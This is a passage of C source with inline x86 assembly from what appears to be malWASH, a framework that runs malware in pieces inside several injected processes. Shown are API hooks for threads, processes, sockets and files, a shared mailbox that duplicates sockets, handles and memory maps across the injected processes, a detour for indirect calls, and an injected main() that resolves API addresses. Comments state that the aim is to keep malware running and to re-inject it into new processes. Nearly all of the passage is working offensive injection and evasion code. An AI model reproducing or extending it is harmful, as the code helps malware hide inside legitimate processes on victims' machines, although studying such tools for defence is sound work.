			pop		esi									//
			pop		ebx									//
			pop		edx									//
			pop		ebp									// restore ebp
			retn 4										// return (don't forget its stdcall!)
	}
	//-------------------------------------------------------------------------------------------------------
	// getcommandline(): GetCommandLine() replacement
	//
	// Arguments: None.
	//
	// Remarks: Illegal HANLDE values, will end up in arbitrary memory writes.
	//
	// Return Value: Function always return 0.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_getcommandline_addr:						//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
			// --------------------------------------------------------------------------
			// getcommandline() function prolog
			// --------------------------------------------------------------------------
		getcommandline:									//
			lea		eax, ds:[STACKBASEADDR+ARGVBASEOFF]	// address of lpCmdLine string
			retn										// return
			// --------------------------------------------------------------------------
			// If you want to return a different string, you can do it this way
			// --------------------------------------------------------------------------
			push	ebp									// backup registers that you're going to use
			push	esi									//
			call	get_noebp_local_storage_esi			// locate local storage
														// get main's ebp, to access local vars
			mov		ebp, dword ptr ds:[esi + noebp_origebp]
			lea		eax, [cmdlineargs]					//
														//
			pop		esi									//
			pop		ebp									//
			retn 										// return
	}
	//-------------------------------------------------------------------------------------------------------
	// second_order_hooks(): Second order hooks. We have 2 types of hooks. The first type are the dup* and
	//		heap hooks. These are very common so we install the hook within basic block and at runtime we 
	//		only need to patch hook addresses.
	//
	//		However there are more function that we need to hook. These are functions from Thread* family
	//		and some others like SetCurrentDirectory. Because it's very rear to meet such functions in 
	//		malware, we choosed to do all the relocations at runtime. Otherwise we would had to add extra
	//		metadata and checks in basic blocks. We'd had an overhead in basic blocks for functions that
	//		we almost never see. 
	//
	//		This function is responsible for installing hooks in these functions.
	//
	//		NOTE: We have an ugly code repetition here, bu I couldn't imagine how many functions I really
	//			had to replace :\ I'm sure you can create a nice loop if you don't like it too!
	//
	// Arguments: None.
	//
	// Return Value: None.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		second_order_hooks:								//
			push	ecx									// backup all registers that you're going to use
			push	edi									//
			push	esi									//
			cld											// DF = 0 (++ mode)
			// --------------------------------------------------------------------------
			// Check against CreateThread()
			// --------------------------------------------------------------------------
			lea		edi, [__CreateThread]				// edi = & of "CreateThread"
			mov		ecx, 13								// strlen( "CreateThread" ) = 12 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		createthread_match					// function has found (CreateThreadFoo also matches)
			// --------------------------------------------------------------------------
			// Check against ExitThread()
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__ExitThread]					// edi = & of "ExitThread"
			mov		ecx, 11								// strlen( "ExitThread" ) = 10 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 11 characters match, then  
			je		exitthread_match					// function has found
			// --------------------------------------------------------------------------
			// Check against SuspendThread()
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__SuspendThread]				// edi = & of "SuspendThread"
			mov		ecx, 14								// strlen( "SuspendThread" ) = 13 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		suspendthread_match					// function has found 
			// --------------------------------------------------------------------------
			// Check against ResumeThread()
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__ResumeThread]				// edi = & of "ResumeThread"
			mov		ecx, 13								// strlen( "ResumeThread" ) = 12 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		resumethread_match					// function has found
			// --------------------------------------------------------------------------
			// Check against SetCurrentDirectoryA()/SetCurrentDirectoryW()
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__SetCurrentDirectory]		// edi = & of "SetCurrentDirectory"
			mov		ecx, 19								// strlen( "ResumeThread" ) = 12 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		setcurrentdir_match					// function has found
			// --------------------------------------------------------------------------
			// Check against GetCommandLineW()
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__GetCommandLineW]			// edi = & of "GetCommandLineW"
			mov		ecx, 15								// strlen( "GetCommandLineW" ) = 15 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		getcommandline_match				// function has found
			// --------------------------------------------------------------------------
			// Check against bind()
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__bind]						// edi = & of "bind"
			mov		ecx, 5								// strlen( "bind" ) = 4 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		bind_match							// function has found
			// --------------------------------------------------------------------------
			// Check against listen()
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__listen]						// edi = & of "listen"
			mov		ecx, 7								// strlen( "listen" ) = 6 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		listen_match						// function has found
			// --------------------------------------------------------------------------
			// Check against accept()
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__accept]						// edi = & of "accept"
			mov		ecx, 7								// strlen( "accept" ) = 6 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		accept_match						// function has found
			// --------------------------------------------------------------------------
			// Check against ExitProcess()
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__ExitProcess]				// edi = & of "ExitProcess"
			mov		ecx, 12								// strlen( "ExitProcess" ) = 11 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 11 characters match, then  
			je		exitproccess_match					// function has found
			// --------------------------------------------------------------------------
			// Check against CreateProcessW()
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__CreateProcessW]				// edi = & of "CreateProcessW"
			mov		ecx, 15								// strlen( "CreateProcessW" ) = 14 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		createprocess_match					// function has found
			// --------------------------------------------------------------------------
			// Check against GetStartupInfoW()
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__GetStartupInfoW]			// edi = & of "GetStartupInfoW"
			mov		ecx, 16								// strlen( "GetStartupInfoW" ) = 15 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		getstartupinfo_push_match			// function has found
			// --------------------------------------------------------------------------
			// Check for FILE* functions: fopen
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__fopen]						// edi = & of "fopen"
			mov		ecx, 6								// strlen("fopen") = 5 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		soh_fopen_match						// function has found
			// --------------------------------------------------------------------------
			// Check for FILE* functions: fputs
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__fputs]						// edi = & of "fputs"
			mov		ecx, 6								// strlen("fputs") = 5 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		soh_fputs_match						// function has found
			// --------------------------------------------------------------------------
			// Check for FILE* functions: fputc
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__fputc]						// edi = & of "fputc"
			mov		ecx, 6								// strlen("fputc") = 5 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		soh_fputc_match						// function has found
			// --------------------------------------------------------------------------
			// Check for FILE* functions: fclose
			// --------------------------------------------------------------------------
			mov		esi, [esp]							// restore original function name
			lea		edi, [__fclose]						// edi = & of "fclose"
			mov		ecx, 7								// strlen("fclose") = 6 + 1 for NULL
			repz cmpsb									// string compare
			test	ecx, ecx							// if the first 12 characters match, then  
			je		soh_fclose_match					// function has found
			// --------------------------------------------------------------------------
			// You can add more functions here
			// --------------------------------------------------------------------------
			jmp		second_order_hooks_end				// we have a non-thread function
			// --------------------------------------------------------------------------
			// install hooks
			// --------------------------------------------------------------------------
		createthread_match:								//
			call	get_createthread_addr				// eax = &createthread()
			jmp		second_order_hooks_end2				// go to the end
														//
		exitthread_match:								//
			call	get_exitthread_addr					// eax = &exitthread()
			jmp		second_order_hooks_end2				// go to the end
														//
		suspendthread_match:							//
			call	get_suspendthread_addr				// eax = &suspendthread()
			jmp		second_order_hooks_end2				// go to the end
														//
		resumethread_match:								//
			call	get_resumethread_addr				// eax = &resumethread()
			jmp		second_order_hooks_end2				// go to the end
														//
		setcurrentdir_match:							//
			call	get_setcurrentdir_addr				// eax = &setcurrentdir()
			jmp		second_order_hooks_end2				// go to the end
														//
		getcommandline_match:							//
			call	get_getcommandline_addr				// eax = &getcommandline()
			jmp		second_order_hooks_end2				// go to the end
														//
		createprocess_match:							//
			call	get_createprocess_sweep_addr		// eax = &CreateProcessA/W()
			jmp		second_order_hooks_end2				// go to the end
														//
		getstartupinfo_push_match:						//
			call	get_getstartupinfo_push_addr		// eax = &CreateProcessA/W()
			jmp		second_order_hooks_end2				// go to the end
														//
		exitproccess_match:								//
			call	get_exitprocess_addr				// eax = &exitprocess()
			jmp		second_order_hooks_end2				// go to the end
														//
		bind_match:										//	
			call	get_bindpush_addr					// eax = & bindpush()
			jmp		second_order_hooks_end2				// go to the end
														//
		listen_match:									//
			call	get_listenpush_addr					// eax = & listenpush()
			jmp		second_order_hooks_end2				// go to the end
														//
		accept_match:									//
			call	get_acceptsweep_addr				// eax = & acceptsweep()	
			jmp		second_order_hooks_end2				// go to the end
														//
		soh_fopen_match:								//
			call	get_fopen_addr						// eax = & fopen()	
			jmp		second_order_hooks_end2				// go to the end
														//
		soh_fputs_match:								//
			call	get_fputs_addr						// eax = & fputs()	
			jmp		second_order_hooks_end2				// go to the end
														//
		soh_fputc_match:								//
			call	get_fputc_addr						// eax = & fputc()	
			jmp		second_order_hooks_end2				// go to the end
														//
		soh_fclose_match:								//
			call	get_fclose_addr						// eax = & fclsoe()	
			// --------------------------------------------------------------------------
			// function epilog
			// --------------------------------------------------------------------------
		second_order_hooks_end2:						//
			mov		dword ptr[esp], 0					// esi = 0
		second_order_hooks_end:							// 
			pop		esi									// restore registers
			pop		edi									//
			pop		ecx									//
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------


// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //
// ++===================================================================================================++ //
// ||                            C O R E   E M U L A T O R   R O U T I N E S                            || //
// ++===================================================================================================++ //
//
// In this part, we have some basic functions that are very important for the emulator.
//
// ++===================================================================================================++ //
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //

	//-------------------------------------------------------------------------------------------------------
	// mailboxchk(): The function checks current's process mailbox for any messages. if function find any
	//	messages it performs the required operation. Mailbox is checked before executing every block.
	//
	// Arguments: None.
	//
	// Return Value: Zero on success. If an error occured, function returns ERROR (-1).
	//-------------------------------------------------------------------------------------------------------
	__asm {
		mailboxchk:										// no function prolog, to improve performance
														// don't backup any registers
			lea		edi, [loctrl]						// edi = &loctrl
			mov		edi, [edi]							// edi =  loctrl
			call	get_noebp_local_storage_esi			// locate local storage
			lea		ebx, dword ptr ds:[esi+noebp_pididx]// 
			mov		ebx, [ebx]							// ebx = pid index
														//
			shl		ebx, 13								// each mailbox entry is 1024 bytes * 8 mails
			push	edi									// backup some usefull registers
			push	ebx									//
			push	dword ptr MAXMAILBOXSIZE			// save number of slots at the top of the stack
														//
		mailboxchk_get_next_slot:						//
			lea		edi, [edi + MAILBOXOFF + ebx]		// edi = loctrl->mailbox[pididx]
														//
			mov		bx, word ptr[edi]					// bx = loctrl->mailbox[pididx].type
			cmp		bx, CMD_NONE						// any messages?
			je		mailboxchk_end						// if there's no message exit
			// --------------------------------------------------------------------------
			// we have a message. Check its type
			// --------------------------------------------------------------------------
			cmp		bx, CMD_WSASTARTUP					// WSAStartup message?
			je		mailboxchk_cmd_wsastarup			//
			cmp		bx, CMD_DUPSOCKINIT					// DuplicateSocket Init message?
			je		mailboxchk_cmd_dupsockinit			//
			cmp		bx, CMD_DUPSOCKCLOSE				// DuplicateSocket Close message?
			je		mailboxchk_cmd_dupsockclose			//
			cmp		bx, CMD_DUPHANDLECLOSE				// DuplicateHandle Close message?
			je		mailboxchk_cmd_duphandleclose		//
			cmp		bx, CMD_ALLOCMEM					// Heap memory allocation ?
			je		mailboxchk_cmd_allocation			//
			cmp		bx, CMD_FREEMEM						// Heap memory deallocation?
			je		mailboxchk_cmd_free					//
			cmp		bx, CMD_MAPMEM						// Memory mapped?
			je		mailboxchk_cmd_mmap					//
			cmp		bx, CMD_SET_CURRENT_DIR				// Current Directory Changed?
			je		mailboxchk_set_current_dir			//
			jmp		mailboxchk_error					// Unknown message. Abort.
			// --------------------------------------------------------------------------
			// WSAStartup message: Call WSAStartup()
			// --------------------------------------------------------------------------
		mailboxchk_cmd_wsastarup:
 			lea		eax, dword ptr [edi + 16]			// use mailbox's data to store WSAData struct
			push	eax									// arg2: lpWSAData
			push	0x0202								// arg1: wVersionRequested = 2.2
			call	[WSAStartup]						// WSAStartup()
			cmp		eax, 0x00							// function was successfull?
			jnz		mailboxchk_error					// if not, abort.
														//
			jmp		mailboxchk_clear					// go to the end
			// --------------------------------------------------------------------------
			// DuplicateSocket Init message: Call WSASocket() to initialize the duplicated sokcet
			// --------------------------------------------------------------------------
		mailboxchk_cmd_dupsockinit:						//
			lea		eax, [edi + 16]						// eax = loctrl->mailbox[pididx].data
														// (we're only interested in argument 4)
			push    0x1									// arag6: dwFlags: WSA_FLAG_OVERLAPPED
			push    0									// arag5: g
			push    eax									// arag4: lpProtocolInfo
			push    0									// arag3: protocol
			push    0									// arag2: type
			push    0									// arag1: af
			call	[WSASocketA]						// WSASocketA() to get the duplicated socket
			cmp		eax, 0xffffffff						// INVALID_SOCKET returned?
			//
			// NOTE: It's possible, another process, open and close a socket. Thus, when the current process
			// continue, it will see a mail for duplicating a socket that doesn't exist. It won't receive
			// a mail to close socket, as this mail only goes to open sockets. So, it's possible for 
			// WSASocket() to fail, because it will try to duplicate a socket that it's closed. However,
			// if we open and close a socket that is not connected anywhere, WSASocket() won't fail (maybe
			// it can create a new socket, not a duplicated one). We ignore such cases (who's gonna to open 
			// and close a socket without connecting it anywhere? :P)
			//
			// jz		mailboxchk_error				// if yes, abort.
			jz		mailboxchk_clear					// if yes don't store socket
			// --------------------------------------------------------------------------
			// Store duplicated socket in the right place in duptab
			// --------------------------------------------------------------------------
			push	eax									// eax hold the duplicated socket != original socket
														//	
			mov		eax, [edi + 4]						// eax = original SOCKET
			call	duptab_intsearch					// find the right entry in duptab
			cmp		eax, 0xffffffff						// SOCKET found?
			// jz		mailboxchk_popnerror			// if not, pop eax and abort.
			jz		mailboxchk_popnclear				// if not, we may tried to open dup socket that it's
														// not open anymore. That's not an error.
														// eax contains duptab index = didx
			lea		edx, [loctrl]						// edx = &loctrl
			mov		edx, [edx]							// edx =  loctrl
			lea		edx, [edx + DUPTABOFF]				// edx =  loctrl->duptab
			imul	eax, eax, DUPTABENTSZ				// eax = offset from duptab to duptab[didx]
														//
			push	esi									// backup esi
			call	get_noebp_local_storage_esi			// locate local storage
			lea		ebx, dword ptr ds:[esi+noebp_pididx]//  
			pop		esi									// restore esi
			mov		ebx, [ebx]							// ebx = pid index
														//
			lea		edx, [edx + eax]					// edx = loctrl->duptab[didx]
			lea		edx, [edx + ebx*4 + 8]				// edx = loctrl->duptab[didx].handle[pididx]
														//
			pop		eax									// restore duplicated handle
			mov		[edx], eax							// store it in duptab
														//
			jmp		mailboxchk_clear					// go to the end
			// --------------------------------------------------------------------------
			// DuplicateSocket Close message: Close a duplicated socket
			// --------------------------------------------------------------------------
		mailboxchk_cmd_dupsockclose:					//
			push	dword ptr[edi + 4]					// push loctrl->mailbox[pididx].handle
			call	[closesocket]						// it's close; no error check
			jmp		mailboxchk_clear					// go to the end
			// --------------------------------------------------------------------------
			// DuplicateHandle Init message: No need for such message, as the process that
			// calls DuplicateHandle(), set up entries in duptab
			// --------------------------------------------------------------------------
			// DuplicateHandle Close message: Close an open handle
			// --------------------------------------------------------------------------
		mailboxchk_cmd_duphandleclose:					//
			push	dword ptr[edi + 4]					// push loctrl->mailbox[pididx].handle
			call	[CloseHandle]						// it's close; no error check
			jmp		mailboxchk_clear					// go to the end
			// --------------------------------------------------------------------------
			// Memory allocation:
			// --------------------------------------------------------------------------
		mailboxchk_cmd_allocation:						//
			push	dword ptr[edi + 0x8]				// arg3: base address to attach
			mov		edx, dword ptr[edi + 0xc]			// arg2: size of shared region
			lea		ecx, dword ptr[edi + 16]			// arg1: name of shared region
			call	attachreg							// attach heap piece to this proccess	
			jmp		mailboxchk_clear					// go to the end
			// --------------------------------------------------------------------------
			// Memory deallocation:
			// --------------------------------------------------------------------------
		mailboxchk_cmd_free:							//
														// handle has the address to be freed
			push	dword ptr[edi + 8]					// push loctrl->mailbox[pididx].reserved2[0]
			call	[UnmapViewOfFile]					// it's close; no error check 
														// detach heap piece from this process
			jmp		mailboxchk_clear					// go to the end
			// --------------------------------------------------------------------------
			// Memory mapping:
			// --------------------------------------------------------------------------
		mailboxchk_cmd_mmap:							//
			push	dword ptr[edi + 0x8]				// lpBaseAddress: loctrl->mailbox[pididx].reserved2[0] = base address
			push	dword ptr[edi + 0xc]				// dwNumberOfBytesToMap: loctrl->mailbox[pididx].reserved2[1] = size
			push	0									// dwFileOffsetLow: 0
			push	0									// dwFileOffsetHigh: 0
			push	2									// dwDesiredAccess: FILE_MAP_READ | FILE_MAP_WRITE
														// (FILE_MAP_ALL_ACCESS can cause ACCESS_DENIED)
			mov		eax,	dword ptr[edi + 0x4]		// eax = loctrl->mailbox[pididx].handle
			call	locduphdl							// find the duplicated one
			push	eax									// hFileMappingObject: duplicated handle
			call	[MapViewOfFileEx]					// MapViewOfFileEx()
			test	eax, eax							// NULL returned?
			je		mailboxchk_error					// if a null is returned, abort
			jmp		mailboxchk_clear					// go to the end
			// --------------------------------------------------------------------------
			// Change directory:
			// --------------------------------------------------------------------------
		mailboxchk_set_current_dir:						//
			lea		ecx, [edi + 16]						// ecx = &loctrl->mailbox[pididx].data
			push	ecx									// arg1: lpPathName
			call	[SetCurrentDirectory]				// change directory (no error check)
			// --------------------------------------------------------------------------
			// clear message
			// --------------------------------------------------------------------------
		mailboxchk_clear:								//
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __0__											// always false		
			mov		word ptr[edi], CMD_NONE				// clear message
			inc		edi									//
			inc		edi									// edi = loctrl->mailbox[pididx].data
			mov		ecx, MAILBOXSIZE					// ecx = MAILBOXSIZE - 2
			dec		ecx									//
			dec		ecx									// 
#endif	
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
			// because CMD_NONE = 0, we can clear the whole mailbox in 1 step
			mov		ecx, MAILBOXSIZE					// ecx = MAILBOXSIZE
														//
			cld											// clear direction flag (++ mode)
			xor		al, al								// NULL
			rep	stosb									// fill loctrl->mailbox[pididx].data with NULLs
														//
		mailboxchk_end:									//
			add		dword ptr[esp + 4], MAILBOXSIZE		// go to the next slot
			mov		edi, [esp + 8]						// restore edi
			mov		ebx, [esp + 4]						// and ebx
			dec		dword ptr [esp]						// decrease counter (ecx--)
			cmp		dword ptr [esp], 0x00				// if we have seen all slots, break
			jg		mailboxchk_get_next_slot			//  
			// it's not really effective to look all mail slots every time, but we have only 8 slots 
			add		esp, 0xc							// pop values from stack first
			mov		eax, 0x00000000						// success!
			retn										// return
		mailboxchk_popnclear:							//
			add		esp, 0x4							// pop stored eax from stack
			jmp		mailboxchk_clear					// go back
		mailboxchk_popnerror:							//
			add		esp, 0x4							// pop stored eax from stack
		mailboxchk_error:								//
			call	[GetLastError]
			add		esp, 0xc							// pop values from stack frist
			or		eax, 0xff000000						// set error code
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------
	// const_detour(): This function is used to handle a very special case: Indirect jumps to dup* functions,
	//		when we have instructions like this:
	//				mov     esi, ds:CloseHandle
	//				...
	//				call    esi
	//		Because the call will transfer control to an absolute address we cannot simply jump to the dup*
	//		hook. Thus we'll use a detour. Address of const_detour() is at known location, so esi will point
	//		there. We know that const_detour() from the basic block, so the return address will point 
	//		somewhere within the block. From there we can search down for a known signature which denotes the
	//		begin of our dup* hook.
	//
	// Remarks: Upon exit, only eax register can be different (we're inside basic block).
	//	Note that control flow will never get transfered here. During startup, we allocate some shared 
	//	memory and we copy function body there.
	//
	// Arguments: None.
	//
	// Return Value: None.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		// this pseudo-function is used to find function address at runtime 
		get_const_detour_addr:							//
			B(0xe8) D(0x00, 0x00, 0x00, 0x00)			// call next instruction
			pop		eax									// get current address
			add		eax, 0x05							// add a small offset to go to the function below
			retn										// return
														//
		const_detour:									//
			mov		eax, [esp]							// get return address
			push	ecx									//
			// We cannot use: repe scasd, because might be aligned with the signature ;)
			mov		ecx, MAXBLKSIZE						// set an upper limit to prevent errors
		const_detour_search_down:						//
			cmp		dword ptr[eax], DUPUNIQUESIG		// signature found?
			je		const_detour_found					// if yes break
			inc		eax									// otherwise increase by 1 (not by 4 as in scasd)
			loop	const_detour_search_down			// get next dword
														//
		const_detour_found:								//
			pop		ecx									// restore ecx
			add		eax, 4								// eax points to signature. Skip it
			jmp		eax									// transfer control to dup* hook
	}
	//-------------------------------------------------------------------------------------------------------
	// maintain_chk(): This function will check if all malWASH instances are alive (for example we can 
	//		require each instance to write a timestamp at the shared region before executing each block).
	//		If we detect that an instance is not alive, we can start it again by injecting malwash in a new
	//		process.
	//	
	//		We have to keep somewhere all messages that an instance received and send them to the process
	//		upon initialization. We also need to have some "reverse" messages: For example, one of the
	//		existing instances must call WSADuplicateSocket() to duplicate a socket for the new instance
	//		and then send the WSAPROTOCOL_INFO to the new process.
	//
	// Arguments: None.
	//
	// Return Value: None. 
	//-------------------------------------------------------------------------------------------------------
	__asm {
		maintain_chk:									// malWASH maintenance
			/* * * * * * * * * * * * * * * * * * * * 
			      ===> NOT IMPLEMENTED YET <===
			 * * * * * * * * * * * * * * * * * * * */
			retn										// return
	}
	//-------------------------------------------------------------------------------------------------------


// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //
// ++===================================================================================================++ //
// ||                                     M A I N   F U N C T I O N                                     || //
// ++===================================================================================================++ //
//
// ... And finally the main() function!
//
// ++===================================================================================================++ //
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * //

	//-------------------------------------------------------------------------------------------------------
	// main(): The main function of injected code.
	//
	// Remarks: In case of an error occurs, edi will contain the error code. In error codes, MSBit is always
	//	set.
	//
	// Arguments: None.
	//
	// Return Value: None.
	//-------------------------------------------------------------------------------------------------------
	__asm {
		main:											// that's main()
			nop											// hackers always start n finish with a nop :P
														// stack frame is already created
			call	get_noebp_local_storage_esi			// get local storage
			mov		ds:[esi + noebp_origebp], ebp		// backup original ebp
			// --------------------------------------------------------------------------
			// initialize function pointers (I know repetition becomes tiring)
			// (when I first wrote it, there was 6 functions, so I didn't use a loop. Eventually 
			//  I added more and more functions ending up in this ugly repetition)
			// --------------------------------------------------------------------------
			lea		ecx, [__CreateFileMappingA]						// arg1: & of "CreateFileMappingA"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[CreateFileMappingA], eax	// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__MapViewOfFileEx]						// arg1: & of "MapViewOfFileEx"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[MapViewOfFileEx], eax		// set function pointer
			call	get_noebp_local_storage_esi			// get local storage
			mov		ds:[esi + noebp_MapViewOfFileEx],eax// backup function address
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//			
			lea		ecx, [__UnmapViewOfFile]						// arg1: & of "UnmapViewOfFile"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[UnmapViewOfFile], eax		// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__CloseHandle]				// arg1: & of "CloseHandle"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[CloseHandle], eax			// set function pointer
			call	get_noebp_local_storage_esi			// get local storage
			mov		ds:[esi + noebp_CloseHandle], eax	// save address
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__DuplicateHandle]						// arg1: & of "DuplicateHandle"
			call	getprocaddr							// fastcall calling convention
			call	get_noebp_local_storage_esi			// get local storage
			mov		ds:[esi+noebp_DuplicateHandle], eax	// save address
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__LoadLibraryA]						// arg1: & of "LoadLibraryA"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[LoadLibraryA], eax		// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__GetProcAddress]						// arg1: & of "GetProcAddressA"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[GetProcAddress], eax		// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__CreateSemaphoreA]						// arg1: & of "CreateSemaphoreA"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[CreateSemaphoreA], eax	// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__ReleaseSemaphore]						// arg1: & of "ReleaseSemaphore"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[ReleaseSemaphore], eax	// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__WaitForSingleObject]						// arg1: & of "WaitForSingleObject"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[WaitForSingleObject], eax	// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_1_PRELOAD_BLOCKS__
			lea		ecx, [__LocalAlloc]					// arg1: & of "LocalAlloc"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[LocalAlloc], eax			// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__LocalFree]					// arg1: & of "LocalFree"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[LocalFree], eax			// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
#endif
//-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
#ifdef __VAR_4_SLEEP_BETWEEN_BLK_EXEC__
			lea		ecx, [__Sleep]						// arg1: & of "Sleep"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[Sleep], eax				// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
#endif
			lea		ecx, [__ExitThread]					// arg1: & of "ExitThread"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[ExitThread], eax			// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__GetLastError]				// arg1: & of "GetLastError"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[GetLastError], eax		// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__OpenProcess]				// arg1: & of "OpenProcess"
			call	getprocaddr							// fastcall calling convention
			call	get_noebp_local_storage_esi			// get local storage
			mov		ds:[esi + noebp_OpenProcess], eax	// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__GetCurrentDirectoryW]		// arg1: & of "GetCurrentDirectory"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[GetCurrentDirectory], eax	// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__SetCurrentDirectoryW]		// arg1: & of "SetCurrentDirectory"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[SetCurrentDirectory], eax	// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__GetLastError]				// arg1: & of "GetLastError"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[GetLastError], eax		// set function pointer
			cmp		eax, 0xffffffff						// error?
			je		main_initfp_error					// in case of error, abort
														//
			lea		ecx, [__SetLastError]				// arg1: & of "SetLastError"
			call	getprocaddr							// fastcall calling convention
			mov		dword ptr[SetLastError], eax		// set function pointer
			cmp		eax, 0xffffffff						// error?
